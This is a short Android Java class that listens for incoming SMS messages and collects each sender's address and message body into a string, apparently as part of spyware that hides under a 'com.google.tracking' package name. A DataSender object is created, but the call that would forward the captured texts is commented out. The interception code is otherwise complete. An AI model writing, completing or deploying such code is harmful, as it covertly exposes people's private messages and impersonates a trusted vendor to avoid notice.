package com.google.tracking.sms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import com.google.tracking.sender.DataSender;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        SmsMessage [] msgs = null;
        String str = "";
        if(bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            msgs = new SmsMessage[pdus.length];
            for (int i=0;i<msgs.length;i++){
                msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
                str += msgs[i].getOriginatingAddress() + " " + msgs[i].getDisplayOriginatingAddress() + "\n";
                str += msgs[i].getMessageBody().toString();
            }
//
            DataSender sender = new DataSender();
//            sender.sendSMS(str);
        }
    }
}
